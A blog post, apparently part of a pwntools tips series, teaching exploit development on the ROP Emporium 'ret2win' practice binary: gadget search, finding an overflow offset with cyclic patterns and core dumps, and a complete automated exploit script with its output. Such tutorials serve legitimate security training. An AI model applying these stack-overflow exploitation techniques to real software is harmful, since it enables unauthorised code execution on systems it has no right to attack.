---
title: "Pwntool Tips 3"
date: 2020-01-04T19:13:37-05:00
toc: false
images:
tags:
  - pwntools
  - exploitdev
---

Before we start, in part 2 of the series I demonstrated finding asm instructions within a binary
using the `elf.search()` function. We passed bytes `ff e4` in order to find the address of a `jmp
rsp` instruction. As it turns out, we can use also the mnemonic if we pass it through `asm()` first.
This way, we don't have to remember that `jmp rsp` is `ff e4` on amd64 architecture.

```python

""" From yesterday """
In [2]: e = ELF('pwnable')
In [3]: next(e.search("\xff\xe4"))
Out[3]: 159281

""" Alternate way, with the mnenonic """
In [3]: searcher = e.search( asm("jmp rsp") )
In [4]: searcher.next()
Out[4]: 159281


```

# Auto-Finding the Offset with Cyclic & Corefiles

The `cyclic` function will generate a deterministic sequence called a 
[De Bruijn](https://en.wikipedia.org/wiki/De_Bruijn_sequence) 
sequence. Since the pattern is always the same, we can rely on the fact that any subsequence will
also be at the same index. That means we can take the sequence at the fault address and search for
the offset within that sequence. Searching is done with the `cyclic_find` function.

`Pwntools` also knows how to deal with core dumps.

From the [Docs](http://docs.pwntools.com/en/stable/elf/corefile.html#using-corefiles-to-automate-exploitation):

> Core dumps are extremely useful when writing exploits, even outside of the normal act of debugging things.


We're going use the first 64-bit challenge from 
[ROP Emporium](https://ropemporium.com/challenge/ret2win.html).
The challenges here are specifically geared toward practicing ROP techniques, so they remove most
reversing and bug-hunting barriers and tell you outright that the overflow length for every
challenge is 40. As a former teacher, I approve of this method. We'll use this known-good value of
40 to test with.

To automatically find the offset:

```python
In [1]: from pwn import *
In [2]: context.clear(arch="amd64")
In [3]: io = process('./ret2win')
In [4]: io.recv()
In [5]: io.sendline( cyclic(128, n=8 )
In [6]: io.wait()
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 1108287)

In [7]: coredump = Core("./core.ret2win.1108287")
[x] Parsing corefile...
    Arch:      amd64-64-little
    RIP:       0x400810
    RSP:       0x7ffcef76b438
    Fault:     0x6161616161616166

In [8]: cyclic_find(coredump.fault_addr, n=8)
Out[8]: 40
```

Here's what a fully automated exploit might look like using what we've learned from the past 3
posts.

```python
from pwn import *
context.arch="amd64"

def overflow(io, data):
    io.recv()
    io.sendline(data)

exe = "ret2win"
io  = process(exe)

overflow( io, cyclic(100, n=8) )
io.wait()

elf_file = ELF(exe)
offset   = cyclic_find( io.corefile.fault_addr, n=8 )
payload  = fit({ offset: elf_file.sym.ret2win })

io = process(exe)
overflow(io, payload)
success( io.recvline() )
```

Output:

```sh
dev ❯❯ python exp.py
[+] Starting local process './ret2win': pid 1248672
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 1248672)
[+] Parsing corefile...: Done
    Arch:      amd64-64-little
    RIP:       0x400810
    RSP:       0x7ffcf9977c28
    Fault:     0x6161616161616166
[+] Starting local process './ret2win': pid 1248677
[+] b"Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}\n"
```

Check out the `cyclic` [docs here](http://docs.pwntools.com/en/stable/util/cyclic.html)
